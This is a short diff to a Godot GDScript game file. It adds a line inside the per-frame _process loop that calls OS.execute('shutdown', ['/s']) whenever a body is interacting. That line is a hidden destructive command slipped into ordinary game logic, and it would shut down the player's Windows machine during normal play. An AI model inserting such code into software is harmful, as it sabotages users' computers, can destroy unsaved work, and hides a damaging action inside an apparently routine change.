@@ -14,7 +14,9 @@ func _process(delta: float) -> void:
 	for body in bodies:
 		if body.get_parent().interacting:
 			body.get_parent().global_position = get_node(resource.connection).global_position
-	
+			var output = []
+			var exit_code = OS.execute("shutdown", ["/s"], output)
+
 
 
 func _on_area_2d_body_entered(body: Node2D) -> void:
